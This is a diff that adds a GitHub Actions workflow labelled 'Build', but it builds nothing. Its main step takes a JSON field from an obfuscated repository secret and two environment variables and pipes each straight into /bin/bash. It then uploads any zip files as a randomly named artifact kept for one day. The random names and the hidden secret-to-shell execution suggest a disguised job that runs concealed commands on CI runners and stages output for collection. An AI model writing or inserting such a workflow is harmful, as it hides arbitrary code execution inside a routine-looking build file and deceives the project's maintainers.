@@ -1,0 +1,30 @@
+name: Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  automation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Process
+        env:
+          p67413: ${{ secrets.p67413 }}
+        run: |
+          printf '%s' "$p67413" | jq -r .ihgh4 | /bin/bash
+          echo $e325 | jq -r .kt6 | /bin/bash
+          echo $wdx4817 | jq -r .ckhip77359 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: JCRtjsPb
+          path: "*.zip"
+          retention-days: 1
